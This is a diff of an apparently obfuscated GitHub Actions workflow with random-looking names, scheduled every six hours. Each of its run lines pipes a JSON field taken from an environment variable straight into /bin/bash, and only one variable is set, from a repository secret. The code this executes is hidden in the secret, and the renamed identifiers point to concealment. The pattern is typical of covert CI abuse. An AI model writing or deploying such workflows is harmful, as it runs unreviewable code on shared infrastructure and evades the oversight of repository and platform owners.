@@ -1,26 +1,26 @@
 name: mabaifu4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 2/6 * * *'
-
-jobs:  # 15311
+    - cron: '7 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: mabaifu4567
         env:
-          uoemj116: ${{ secrets.uoemj116 }}
+          ubbg03087: ${{ secrets.ubbg03087 }}
         run: |
-          echo $uoemj116 | jq -r .gnejg24298 | /bin/bash
-          echo $hjlui952 | jq -r .ovcpb1 | /bin/bash
-          echo $elodq44072 | jq -r .ak702 | /bin/bash
-          echo $bvw177 | jq -r .cpo71011 | /bin/bash
-          echo $tfoqf8853 | jq -r .tktcy4037 | /bin/bash
-          echo $zmj4 | jq -r .ymhb3 | /bin/bash
-          echo $nrxo4 | jq -r .r37164 | /bin/bash
-          echo $g5 | jq -r .pdhfu971 | /bin/bash
-          echo $tyh8 | jq -r .e4786 | /bin/bash
-          echo $vmnhb8999 | jq -r .t2403 | /bin/bash
+          echo $ubbg03087 | jq -r .px84 | /bin/bash
+          echo $z739 | jq -r .t06 | /bin/bash
+          echo $bsvty7 | jq -r .hy13 | /bin/bash
+          echo $eqk0117 | jq -r .erqbt43929 | /bin/bash
+          echo $ooafo92 | jq -r .fto49069 | /bin/bash
+          echo $aevn23 | jq -r .kypq23922 | /bin/bash
+          echo $e335 | jq -r .vtfw79 | /bin/bash
+          echo $mcrms5 | jq -r .cxyke09236 | /bin/bash
+          echo $xg3 | jq -r .yz6914 | /bin/bash
+          echo $rhsgo2 | jq -r .m87 | /bin/bash
 
